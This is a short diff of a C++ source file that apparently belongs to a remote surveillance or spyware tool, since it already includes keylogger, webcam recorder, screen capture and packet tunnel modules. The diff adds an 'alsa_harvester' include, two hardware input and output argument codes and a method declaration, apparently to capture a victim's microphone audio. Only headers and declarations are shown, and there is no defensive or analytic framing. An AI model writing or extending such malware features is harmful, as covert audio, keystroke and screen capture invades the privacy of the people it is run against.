@@ -22,6 +22,7 @@
 #include <chrono>
 #include <thread>
 #include "keylogger.hpp"
+#include "alsa_harvester.hpp"
 #include "webcam_recorder.hpp"
 #include "screen_hunter.hpp"
 #include "packet_tunnel.hpp"
@@ -44,6 +45,8 @@
 #define KB_LAYOUT_ARG 11
 #define CONVERT_ARG 12
 #define FPS_ARG 13
+#define HW_IN_ARG 14
+#define HW_OUT_ARG 15
 
 #define ARG_TYPE_INT 0x1A
 #define ARG_TYPE_STRING 0x1B
@@ -122,7 +125,8 @@ private:
     void keylogger();
     void webcam_recorder();
     void screen_hunter();
-    
+    void alsa_harvester();
+
     uint find_open_port();
     void send_packet(uint16_t __packet, int __client_index);    
     void send_client(CommandCode __command, uint8_t __port, int __client_index);
